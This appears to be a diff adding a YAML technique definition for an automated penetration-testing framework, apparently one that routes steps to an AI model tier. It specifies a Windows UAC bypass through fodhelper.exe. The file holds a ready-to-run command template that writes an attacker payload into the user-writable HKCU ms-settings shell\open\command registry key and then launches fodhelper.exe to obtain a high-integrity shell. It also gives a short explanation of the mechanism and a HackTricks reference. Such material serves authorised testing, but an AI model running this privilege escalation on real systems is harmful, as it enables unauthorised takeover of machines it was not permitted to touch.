@@ -1,0 +1,33 @@
+name: uac_bypass_fodhelper
+category: privesc
+description: UAC bypass — fodhelper.exe auto-elevates and reads ms-settings protocol
+preconditions:
+- shell_obtained
+- uac_enabled
+- is_local_admin
+parameters:
+  payload: from_engagement.uac_payload
+command_template: reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve
+  /t REG_SZ /d "{payload}" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command
+  /v DelegateExecute /t REG_SZ /d "" /f && fodhelper.exe
+parser: generic_parser
+expected_effects:
+- uac_bypassed
+- high_integrity_shell
+- admin_context
+falsifier:
+  pattern: not elevated|AC|integrity=Medium|patched
+  timeout: 30
+model_tier: haiku
+mechanism: 'fodhelper.exe is auto-elevated (autoElevate=true in manifest) and launches
+  the
+
+  ms-settings: URL handler. The handler reads HKCU\Software\Classes\ms-settings,
+
+  which is user-writable, so point its shell\open\command at anything → high-integrity.
+
+  '
+references:
+  ocd_mindmap: 'Branch 11: UAC bypass (fodhelper)'
+  hacktricks: windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.md
+hacktricks_ref: windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.md
